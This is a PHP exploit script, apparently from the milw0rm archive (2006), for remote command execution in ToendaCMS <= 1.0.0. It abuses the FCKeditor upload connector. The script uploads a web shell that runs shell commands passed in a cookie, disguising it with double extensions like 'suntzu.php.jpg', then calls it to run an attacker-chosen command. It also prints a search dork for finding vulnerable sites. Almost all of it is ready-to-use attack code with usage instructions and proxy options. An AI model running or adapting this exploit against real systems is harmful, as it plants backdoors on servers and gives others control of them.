#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;ToendaCMS &lt;= 1.0.0 Shizouka stable &#039;F(u)CKeditor&#039; remote commands execution\n&quot;;
echo &quot;by rgod rgod@autistici.org\n&quot;;
echo &quot;site: http://retrogod.altervista.org\n&quot;;
echo &quot;dork: \&quot;toendaCMS is Free Software released under the GNU/GPL License.\&quot; | \&quot;powered by toendaCMS\&quot; -inurl:demo\n\n&quot;;

//works regardless of any php.ini settings,


if ($argc&lt;4) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path cmd OPTIONS\n&quot;;
echo &quot;host:      target server (ip/hostname)\n&quot;;
echo &quot;path:      path to toendacms\n&quot;;
echo &quot;cmd:       a shell command\n&quot;;
echo &quot;Options:\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\n&quot;;
echo &quot;Example:\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /cms/ ls -la\n&quot;;
die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy=&quot;&quot;;
$cmd=&quot;&quot;;
for ($i=3; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}

if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

$shell=&quot;&lt;?php echo chr(72).\&quot;i Master!\&quot;;if(get_magic_quotes_gpc()){\$_COOKIE[\&quot;cmd\&quot;]=stripslashes(\$_COOKIE[\&quot;cmd\&quot;]);}&quot;;
$shell.=&quot;ini_set(\&quot;max_execution_time\&quot;,0);error_reporting(0);&quot;;
$shell.=&quot;echo \&quot;*delim*\&quot;;passthru(\$_COOKIE[\&quot;cmd\&quot;]);?&gt;&quot;;
$allowed_extensions = array(&quot;zip&quot;,&quot;doc&quot;,&quot;xls&quot;,&quot;pdf&quot;,&quot;rtf&quot;,&quot;csv&quot;,&quot;jpg&quot;,&quot;gif&quot;,&quot;jpeg&quot;,&quot;png&quot;,&quot;avi&quot;,&quot;mpg&quot;,&quot;mpeg&quot;,&quot;swf&quot;,&quot;fla&quot;);
for ($i=0; $i&lt;=count($allowed_extensions)-1; $i++){
$filename=&quot;suntzu.php.&quot;.$allowed_extensions[$i];
$data=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
$data.=&quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;$filename\&quot;\r\n&quot;;
$data.=&quot;Content-Type:\r\n\r\n&quot;;
$data.=&quot;$shell\r\n&quot;;
$data.=&quot;-----------------------------7d529a1d23092a--\r\n&quot;;
$packet=&quot;POST &quot;.$p.&quot;engine/js/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&amp;Type=File&amp;CurrentFolder=%2f HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
//echo $html;
$packet=&quot;GET &quot;.$p.&quot;data/images/File/&quot;.$filename.&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: cmd=&quot;.$cmd.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
//echo $html;
if (eregi(&quot;Hi Master!&quot;,$html)){
$temp=explode(&quot;*delim*&quot;,$html);
die($temp[1]);}
}
//if you are here...
echo &quot;Exploit failed...&quot;;
?&gt;

# milw0rm.com [2006-07-18]
